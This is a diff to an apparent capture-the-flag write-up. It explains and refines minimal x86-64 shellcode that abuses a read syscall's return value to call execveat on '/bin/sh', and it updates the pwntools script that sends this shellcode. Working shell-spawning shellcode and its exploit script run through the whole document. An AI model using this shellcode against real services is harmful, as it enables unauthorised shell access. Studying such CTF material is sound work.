@@ -17,6 +17,15 @@ jne    0xfffffffffffffffc
 * First time read the `/bin/sh\x00` with padding to let length of it become 322 to the stack.
 * After `jne` it continue at `xor edx,esp` with `rax = 322` , `rsi = /bin/sh` and cause `rdx = edx ^ esp ^ esp = 0`.
 * Syscall again -> execveat( 0 , "/bin/sh" , 0 , 0 ).
+* Better way XD:
+```asm
+    push rsp
+    pop rsi
+y:
+    xor edx,esp
+    syscall
+    jmp y
+```
 ```python
 #!/usr/bin/env python
 from pwn import *
@@ -41,13 +50,15 @@ sc = flat(
 #print disasm( sc )
 
 _asm = '''
-push rsp
-pop rsi
-xor edx,esp
-syscall
+    push rsp
+    pop rsi
+y:
+    xor edx,esp
+    syscall
+    jmp y
 '''
 
-y.sendafter( ':' , asm( _asm ) + '\x75\xfa'  ) # jne    0xfffffffffffffffc -> jne -4
+y.sendafter( ':' , asm( _asm ) )
 
 sleep(0.7)
 
